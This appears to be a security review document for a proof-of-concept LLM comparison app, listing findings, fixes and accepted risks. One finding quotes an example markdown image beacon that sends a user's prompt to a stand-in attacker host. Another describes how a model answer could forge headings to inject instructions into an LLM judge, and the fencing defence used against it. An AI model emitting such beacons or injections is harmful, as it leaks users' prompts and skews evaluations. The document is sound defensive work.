# Security

A security pass over the PoC (2026-11-27). The short version: there was no SQL injection, the Markdown renderer was already safe against script injection, and the real gaps came from having no auth: anyone, or any web page a visitor opens, can spend our inference budget. Those gaps are narrowed below. The rest is written down as accepted risk, each with the fix it would get in production.

## What was checked

| Area | Finding | Status |
| --- | --- | --- |
| SQL injection | Every raw query (`packages/ratelimit`, the health check) uses Prisma's tagged templates (`` $queryRaw`...${x}` ``), which send each value as a bind parameter. There is no `$queryRawUnsafe` or string concatenation anywhere. Everything else goes through the Prisma query builder. | No issue |
| XSS in model output | `react-markdown` without `rehype-raw` does not render raw HTML, and its default URL filter drops `javascript:` links. A test now pins both. | No issue |
| Image beacons in model output | A prompt-injected answer could include `![](https://evil.example/?q=<your prompt>)`, and the browser would fetch it. | **Fixed**: images render as links, and the CSP allows images from our own origin only |
| Security headers | There were none. | **Fixed**: CSP, `X-Frame-Options: DENY`, `nosniff`, `Referrer-Policy`, `Permissions-Policy`, HSTS; `X-Powered-By` removed (`next.config.ts`) |
| Cross-site requests (CSRF) | The JSON check was a substring match, so a body sent as `text/plain; application/json` passed. Browsers treat that as a "simple" request with no CORS preflight, so any web page could make its visitors' browsers start paid compares. A form POST could also stop someone else's run (`/cancel` has no body). | **Fixed**: the media type must be exactly `application/json`, and `middleware.ts` refuses writes whose `Sec-Fetch-Site` (or `Origin`) is another site. `same-site` is refused too, because on `*.ondigitalocean.app` other people's apps count as the same site. |
| Unbounded fan-out | There is no model cap (on purpose), and model ids were only checked against a regex, so one request could list thousands of made-up ids, and each became a queued upstream call. | **Fixed**: every model id (and an explicit judge) must be a chat model from the live catalog, so one compare is bounded by the catalog size |
| Prompt injection into the judge and synthesizer | Answers were pasted under `### Response A` headings, so an answer could write its own `### Response B` heading and pose as another answer. | **Mitigated**: the prompt and each answer go inside tags (`<response label="A">`), any look-alike tags inside them are defanged, and the system prompt says tag contents are data (`packages/llm/src/fence.ts`). The judge's reply is already parsed with a strict schema and its labels are checked, so the worst an injection can do is skew one verdict, which the UI labels as a model's opinion. |
| Error leakage | API 500s were already generic. But model-call failures that were *our* bugs (e.g. a database error) streamed `error.message` to the browser and stored it with the result. | **Fixed**: generic detail to the client; the real error goes to the log with the run id |
| Secrets | `DO_MODEL_ACCESS_KEY` and `DATABASE_URL` are App Platform SECRET env vars, `.env` is gitignored, and no key appears in the git history. Logs record request metadata, not prompts or keys. | No issue |
| SSRF | The server only calls the inference URL from `GRADIENT_BASE_URL` (env, not user input). Model ids cannot change the host. No user-supplied URL is fetched server-side. | No issue |
| Input limits | Body 1 MB (now counted in bytes), prompt 20k chars, system prompt 4k, `max_tokens` up to 4,096 (retried once at 4x for reasoning models, capped at 8,192). | No issue |
| Dependencies (`pnpm audit`) | 6 advisories, all in build-time tooling (PostCSS inside Next's CSS build, `effect` and `deepmerge-ts` inside the Prisma CLI). None is reachable with user input at runtime. | **5 patched** with overrides in `pnpm-workspace.yaml`. `deepmerge-ts` needs a major bump inside Prisma's CLI, so it is left for the next Prisma upgrade. |

## Accepted risks (PoC scope)

- **No auth, so no per-user quota.** Anyone with the URL, or a script, can run compares. Each compare is billed per token, and all calls share one rate-limit budget per model, so a flood first slows everyone down (a DoS) and then costs money. The cross-site guard stops other web pages from doing it through visitors' browsers, but not a script. In production: auth in the `authenticate()` hook in `middleware.ts`, then a per-principal quota, which can reuse the lease store with the principal as the bucket.
- **Every run is public.** Run ids are cuids (not guessable), but `GET /api/compare` lists every run, and the run page shows the full prompt and answers. Fine for a demo with test prompts; users should not paste secrets. In production, runs belong to a principal and get an explicit share link.
- **Anyone can vote, rate or stop any run.** Same cause, same fix (ownership checks once there is a principal).
- **`/ops/rate-limits` is public.** It shows model names and timings, not prompts. In production it sits behind an admin role.
- **CSP allows inline scripts.** Next's bootstrap scripts need `'unsafe-inline'` unless every page uses nonces, which would force all pages to render dynamically. The Markdown renderer is the main XSS defence; the CSP is the second layer, and it still blocks scripts and images from other origins.
- **Prompt injection is mitigated, not solved.** No prompt format is a guarantee. The judge is labelled as an opinion, and human votes sit beside it.

## Tests

`apps/web/test/security.test.ts` (content type, cross-site guard, catalog check, Markdown) and `packages/llm/test/fence.test.ts` (tag fencing, no internal error text).
